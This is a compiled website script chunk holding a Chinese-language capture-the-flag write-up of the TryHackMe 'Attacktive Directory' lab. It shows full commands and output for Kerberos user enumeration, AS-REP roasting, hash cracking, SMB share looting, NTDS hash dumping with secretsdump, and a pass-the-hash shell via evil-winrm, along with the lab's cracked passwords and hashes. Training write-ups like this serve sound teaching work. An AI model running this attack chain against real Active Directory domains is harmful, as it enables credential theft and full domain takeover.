"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8443],{1297:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>i,contentTitle:()=>c,default:()=>l,frontMatter:()=>a,metadata:()=>r,toc:()=>d});var s=n(74848),o=n(28453);const a={sidebar_position:80,tags:["Easy","Windows","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","Kerberos AS-REP Rosating","Hash dump","PTH"],title:"Attacktive Directory",description:"Attacktive Directory",sidebar_label:"Attacktive Directory",slug:"/tryhackme/80"},c="Attacktive Directory",r={id:"box/TryHackMe/80",title:"Attacktive Directory",description:"Attacktive Directory",source:"@site/docs/box/TryHackMe/80.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/80",permalink:"/docs/tryhackme/80",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Windows",permalink:"/docs/tags/windows"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"Kerberos AS-REP Rosating",permalink:"/docs/tags/kerberos-as-rep-rosating"},{label:"Hash dump",permalink:"/docs/tags/hash-dump"},{label:"PTH",permalink:"/docs/tags/pth"}],version:"current",sidebarPosition:80,frontMatter:{sidebar_position:80,tags:["Easy","Windows","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","Kerberos AS-REP Rosating","Hash dump","PTH"],title:"Attacktive Directory",description:"Attacktive Directory",sidebar_label:"Attacktive Directory",slug:"/tryhackme/80"},sidebar:"boxSidebar",previous:{title:"Mr Robot CTF",permalink:"/docs/tryhackme/79"},next:{title:"Net Sec Challenge",permalink:"/docs/tryhackme/81"}},i={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"139/445 - SMB",id:"139445---smb",level:2},{value:"88 - kerberos",id:"88---kerberos",level:2},{value:"139/445 - SMB",id:"139445---smb-1",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"Administrator",id:"administrator",level:3}];function p(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"attacktive-directory",children:"Attacktive Directory"}),"\n",(0,s.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# nmap -sTCV -p 53,80,88,135,139,389,445,464,593,636,3268,3389,5985,9389,47001,49664,49666,49669,49670,49671,49673,49677,49684,49692,49806 --min-rate 1000 10.10.21.64\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-11 02:49 BST\nNmap scan report for ip-10-10-21-64.eu-west-1.compute.internal (10.10.21.64)\nHost is up (0.0057s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-11 01:49:23Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local\n| Not valid before: 2023-09-10T01:28:15\n|_Not valid after:  2024-03-11T01:28:15\n|_ssl-date: 2023-09-11T01:50:17+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         Microsoft Windows RPC\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49677/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  msrpc         Microsoft Windows RPC\n49692/tcp open  msrpc         Microsoft Windows RPC\n49806/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 02:4B:E3:B2:34:8D (Unknown)\nService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: <unknown>, NetBIOS MAC: 02:4b:e3:b2:34:8d (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-09-11 02:50:18\n|_  start_date: 1600-12-31 23:58:45\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 70.46 seconds\n"})}),"\n",(0,s.jsx)(t.h2,{id:"139445---smb",children:"139/445 - SMB"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# enum4linux 10.10.21.64\n......\nLooking up status of 10.10.21.64\n\tATTACKTIVEDIREC <00> -         B <ACTIVE>  Workstation Service\n\tTHM-AD          <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name\n\tTHM-AD          <1c> - <GROUP> B <ACTIVE>  Domain Controllers\n\tTHM-AD          <1b> -         B <ACTIVE>  Domain Master Browser\n\tATTACKTIVEDIREC <20> -         B <ACTIVE>  File Server Service\n.....\n"})}),"\n",(0,s.jsx)(t.h2,{id:"88---kerberos",children:"88 - kerberos"}),"\n",(0,s.jsxs)(t.p,{children:["\u5728\u9898\u76ee\u4e2d\u7ed9\u51fa\u4e86\u4e24\u4e2a\u5b57\u5178, \u6211\u4eec\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u626b\u63cf\u7528\u6237, \u6ce8\u610f\u8fd9\u91cc\u7684\u57df\u4e3a : ",(0,s.jsx)(t.code,{children:"spookysec.local"})]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# ./kerbrute userenum  --dc spookysec.local  -d spookysec.local  userlist.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.1 (385cb2b) - 09/11/23 - Ronnie Flathers @ropnop\n\n2023/09/11 03:54:39 >  Using KDC(s):\n2023/09/11 03:54:39 >  \tspookysec.local:88\n\n2023/09/11 03:54:39 >  [+] VALID USERNAME:\t james@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t svc-admin@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t James@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t robin@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t darkstar@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t administrator@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t backup@spookysec.local\n2023/09/11 03:54:40 >  [+] VALID USERNAME:\t paradox@spookysec.local\n2023/09/11 03:54:41 >  [+] VALID USERNAME:\t JAMES@spookysec.local\n2023/09/11 03:54:41 >  [+] VALID USERNAME:\t Robin@spookysec.local\n2023/09/11 03:54:43 >  [+] VALID USERNAME:\t Administrator@spookysec.local\n2023/09/11 03:54:46 >  [+] VALID USERNAME:\t Darkstar@spookysec.local\n2023/09/11 03:54:47 >  [+] VALID USERNAME:\t Paradox@spookysec.local\n2023/09/11 03:54:50 >  [+] VALID USERNAME:\t DARKSTAR@spookysec.local\n2023/09/11 03:54:50 >  [+] VALID USERNAME:\t ori@spookysec.local\n2023/09/11 03:54:52 >  [+] VALID USERNAME:\t ROBIN@spookysec.local\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u8fd9\u91cc\u6211\u4eec\u6536\u96c6\u5230\u4e86\u51e0\u4e2a\u7528\u6237, \u867d\u7136\u6211\u4eec\u6709\u5bc6\u7801\u8868\u4f46\u662f\u8fd8\u4e0d\u662f\u4f7f\u7528\u7684\u65f6\u5019, \u8fd9\u65f6\u5019\u6211\u4eec\u6ca1\u6709\u5bc6\u7801\u53ea\u6709\u7528\u6237\u6211\u4eec\u5e94\u8be5\u5c1d\u8bd5 AS-REP Roasting \u653b\u51fb"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# GetNPUsers.py spookysec.local/ -dc-ip 10.10.21.64 -usersfile user.txt \nImpacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra\n\n[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] invalid principal syntax\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8af969802578b3b693d770cc6303e2f7$296514b1c1bbb3b07eef3b93fe91d26b199d07b46a6854bc7023fa2d9791dd7a6e7d8b55429f5c1e57269f85da9adb56056bd445fc0048714d93ae63e7f93c13218982455edf1f3f0ce9fb1efed3b4f94c255fced00c728a5eda4306b605c624708c0c26c011066c1566598f72f3de0a6c7944676b438a524a7900cd49a32b8685fee9d7b0a9719e97424bd287e93b72c2a5bf6b78f4b179f03594fd07b4c24f438839201278695184f301493fa1ae1230f032433005b52f781be58127dab39152fbb8cd7695afb4415c59f3397a9ec3c886ba3f5c362b3638aa9560b6df43564f18c2e29b77fbbf6b0e94b71d0d9a286098\n[-] invalid principal syntax\n"})}),"\n",(0,s.jsx)(t.p,{children:"\u6536\u96c6\u5230\u7528\u6237 svc-admin \u7684\u7968\u8bc1\u540e, \u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# hashcat -a 0 -m 18200 svc-admin-hash.txt passwordlist.txt\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8af969802578b3b693d770cc6303e2f7$296514b1c1bbb3b07eef3b93fe91d26b199d07b46a6854bc7023fa2d9791dd7a6e7d8b55429f5c1e57269f85da9adb56056bd445fc0048714d93ae63e7f93c13218982455edf1f3f0ce9fb1efed3b4f94c255fced00c728a5eda4306b605c624708c0c26c011066c1566598f72f3de0a6c7944676b438a524a7900cd49a32b8685fee9d7b0a9719e97424bd287e93b72c2a5bf6b78f4b179f03594fd07b4c24f438839201278695184f301493fa1ae1230f032433005b52f781be58127dab39152fbb8cd7695afb4415c59f3397a9ec3c886ba3f5c362b3638aa9560b6df43564f18c2e29b77fbbf6b0e94b71d0d9a286098:management2005\n"})}),"\n",(0,s.jsx)(t.h2,{id:"139445---smb-1",children:"139/445 - SMB"}),"\n",(0,s.jsx)(t.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u8d26\u53f7\u8fdb\u884c\u679a\u4e3e SMB \u670d\u52a1, \u53d1\u73b0\u6709\u4e00\u4e9b\u5171\u4eab\u53ef\u8bfb"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-162-222:~/attacktivedirectory# smbmap.py -H 10.10.21.64 -u svc-admin -d spookysec.local -p management2005\n\n    ________  ___      ___  _______   ___      ___       __         _______\n   /"       )|"  \\    /"  ||   _  "\\ |"  \\    /"  |     /""\\       |   __ "\\\n  (:   \\___/  \\   \\  //   |(. |_)  :) \\   \\  //   |    /    \\      (. |__) :)\n   \\___  \\    /\\  \\/.    ||:     \\/   /\\   \\/.    |   /\' /\\  \\     |:  ____/\n    __/  \\   |: \\.        |(|  _  \\  |: \\.        |  //  __\'  \\    (|  /\n   /" \\   :) |.  \\    /:  ||: |_)  :)|.  \\    /:  | /   /  \\   \\  /|__/ \\\n  (_______/  |___|\\__/|___|(_______/ |___|\\__/|___|(___/    \\___)(_______)\n -----------------------------------------------------------------------------\n     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com   \n                     https://github.com/ShawnDEvans/smbmap\n\n                                                                                                    \n[+] IP: 10.10.21.64:445\tName: spookysec.local     \tStatus: Authenticated\n        Disk                                                  \tPermissions\tComment\n\t----                                                  \t-----------\t-------\n\tADMIN$                                            \tNO ACCESS\tRemote Admin\n\tbackup                                            \tREAD ONLY\t\n\tC$                                                \tNO ACCESS\tDefault share\n\tIPC$                                              \tREAD ONLY\tRemote IPC\n\tNETLOGON                                          \tREAD ONLY\tLogon server share \n\tSYSVOL                                            \tREAD ONLY\tLogon server share\n'})}),"\n",(0,s.jsx)(t.p,{children:"\u8fde\u63a5 backup \u5728\u5176\u4e2d\u83b7\u53d6\u5230\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'root@ip-10-10-162-222:~/attacktivedirectory# smbclient   -U svc-admin@spookysec.local%management2005  //10.10.21.64/backup\nWARNING: The "syslog" option is deprecated\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sat Apr  4 20:08:39 2020\n  ..                                  D        0  Sat Apr  4 20:08:39 2020\n  backup_credentials.txt              A       48  Sat Apr  4 20:08:53 2020\n\n\t\t8247551 blocks of size 4096. 3652081 blocks available\nsmb: \\> get backup_credentials.txt \ngetting file \\backup_credentials.txt of size 48 as backup_credentials.txt (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)\nsmb: \\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now\n\nroot@ip-10-10-162-222:~/attacktivedirectory# ls\nbackup_credentials.txt  kerbrute  passwordlist.txt  svc-admin-hash.txt  userlist.txt  user.txt\nroot@ip-10-10-162-222:~/attacktivedirectory# wc backup_credentials.txt \n 0  1 48 backup_credentials.txt\nroot@ip-10-10-162-222:~/attacktivedirectory# cat backup_credentials.txt \nYmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw\n'})}),"\n",(0,s.jsxs)(t.p,{children:["\u7ecf\u8fc7\u89e3\u5bc6\u6211\u5f97\u5230\u4e00\u4e2a backup \u7528\u6237, \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8f6c\u50a8\u54c8\u5e0c ",(0,s.jsx)(t.a,{href:"https://gchq.github.io/CyberChef/#input=WW1GamEzVndRSE53YjI5cmVYTmxZeTVzYjJOaGJEcGlZV05yZFhBeU5URTNPRFl3",children:"CyberChef"})]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# secretsdump.py spookysec.local/backup:backup2517860@10.10.21.64\nImpacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::\n"})}),"\n",(0,s.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(t.h3,{id:"administrator",children:"Administrator"}),"\n",(0,s.jsx)(t.p,{children:"\u4f7f\u7528\u8f6c\u50a8\u5f97\u5230\u7684\u54c8\u5e0c\u503c, \u8fdb\u884c PTH \u653b\u51fb"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-162-222:~/attacktivedirectory# evil-winrm -i 10.10.21.64 -u administrator  -H 0e0363213e37b94221497260b0bcb4fc\n\nEvil-WinRM shell v2.4\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>\n"})})]})}function l(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(p,{...e})}):p(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>c,x:()=>r});var s=n(96540);const o={},a=s.createContext(o);function c(e){const t=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function r(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:c(e.components),s.createElement(a.Provider,{value:t},e.children)}}}]);